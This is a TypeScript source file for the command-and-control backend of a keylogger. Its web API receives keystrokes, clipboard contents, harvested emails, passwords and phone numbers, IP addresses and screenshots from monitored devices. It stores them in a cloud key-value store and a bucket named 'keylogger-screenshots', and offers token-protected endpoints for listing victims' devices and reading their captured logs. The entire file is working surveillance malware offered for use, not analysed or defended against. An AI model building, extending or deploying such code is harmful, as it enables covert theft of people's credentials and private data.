import { PutObjectCommand, S3Client } from '@aws-sdk/client-s3';
import { Hono } from 'hono';
import { cors } from 'hono/cors';

interface Bindings {
  keylogger: KVNamespace;
  ACCESS_KEY_ID: string;
  SECRET_ACCESS_KEY: string;
  ACCESS_TOKEN: string;
}

type DeviceData = {
  device_name: string;
  device_id: string;
  IPs: {
    private_ip: string;
    public_ip: string;
  };
  log: {
    [timestamp: string]: {
      raw: string;
      clipboard: string;
      data: {
        emails: string[];
        passwords: string[];
        phone_numbers: string[];
      };
    };
  };
};

const uploadToS3 = async (
  s3Client: S3Client,
  file: File,
  bucketName: string,
  key: string,
): Promise<String> => {
  try {
    const command = new PutObjectCommand({
      Bucket: bucketName,
      Key: `uploads/${key}`,
      Body: file,
      ContentType: file.type,
    });
    await s3Client.send(command);
    return `https://${bucketName}.s3.us-west-004.backblazeb2.com/uploads/${key}`;
  } catch (error) {
    console.error('Error uploading file:', error);
    throw error;
  }
};

const app = new Hono<{ Bindings: Bindings }>();
app.use('/*', cors());
app.get('/', (c) => {
  return c.text('Nothing here');
});

app.post('/api/login', async (c) => {
  const { accessToken } = (await c.req.json()) as { accessToken: string };
  if (!accessToken) {
    return c.json(
      { status: 'error', message: 'No access token provided' },
      400,
    );
  }
  if (accessToken === c.env.ACCESS_TOKEN) {
    return c.json({ status: 'success', message: 'Logged in successfully' });
  }
  return c.json({ status: 'error', message: 'Invalid access token' }, 401);
});

app.post('/api/logs', async (c) => {
  const s3Client = new S3Client({
    region: 'us-west-004',
    endpoint: 'https://s3.us-west-004.backblazeb2.com',
    credentials: {
      accessKeyId: c.env.ACCESS_KEY_ID,
      secretAccessKey: c.env.SECRET_ACCESS_KEY,
    },
  });
  const formData = await c.req.formData();
  const file = formData.get('file') as File;
  const logData = formData.get('log_data');
  if (!logData || typeof logData !== 'string') {
    return c.json({ error: 'Invalid log data' }, 400);
  }
  const data = JSON.parse(logData) as DeviceData;
  const bucketName = 'keylogger-screenshots';
  const uploadURL = await uploadToS3(
    s3Client,
    file,
    bucketName,
    `${data.device_id}/${Date.now()}.png`,
  );
  let currentData: Array<any> | null = await c.env.keylogger.get(
    `${data.device_id}`,
    {
      type: 'json',
    },
  );

  if (!currentData) {
    currentData = [];
  }
  const timestamp = Object.keys(data.log)[0];
  const entry = data.log[timestamp];
  currentData.push({
    screenshot: uploadURL,
    timestamp: timestamp,
    raw: entry.raw,
    clipboard: entry.clipboard,
    data: entry.data,
  });
  await c.env.keylogger.put(`${data.device_id}`, JSON.stringify(currentData), {
    metadata: {
      device_name: data.device_name,
      device_id: data.device_id,
      IPs: data.IPs,
    },
  });
  return c.text('OK', 200);
});

app.get('/api/devices', async (c) => {
  const accessToken = c.req.header('Authorization');
  if (accessToken !== c.env.ACCESS_TOKEN) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  const listResult = await c.env.keylogger.list();
  return c.json(listResult, 200);
});

app.get('/api/logs/:id', async (c) => {
  const accessToken = c.req.header('Authorization');
  if (accessToken !== c.env.ACCESS_TOKEN) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  const deviceID = c.req.param('id');
  if (!deviceID) {
    return c.json({ error: 'No device ID provided' }, 400);
  }
  const data = await c.env.keylogger.get(deviceID, { type: 'json' });
  return c.json(data || [], 200);
});

export default app;
